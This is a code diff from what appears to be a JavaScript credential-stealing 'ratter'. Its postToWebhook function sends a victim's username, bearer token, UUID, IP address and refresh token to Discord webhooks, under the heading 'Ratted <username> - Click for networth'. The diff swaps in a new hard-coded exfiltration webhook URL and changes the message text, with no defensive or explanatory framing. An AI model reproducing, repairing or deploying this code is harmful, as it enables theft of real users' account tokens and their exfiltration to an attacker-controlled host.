@@ -126,7 +126,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     let data = {
   username: "MOG",
   avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
-  content: "@everyone",
+  content: "New Person",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
     axios.all([ 
         axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1035752185490833508/6tAmz051rgJoLKodXYjLZXLGjkqit3p37DgZweN6zi0ShhD3hCSkuQpr1G5d9V-YxcKC", data)
+        axios.post("https://discord.com/api/webhooks/1041139338345455647/Vvl5lajy2tw__7WcCpNdbuE4bZWehe9isDe_vXtb--PbD2_Mv63Vj6cOOnrVqxn9JFuu", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])
     
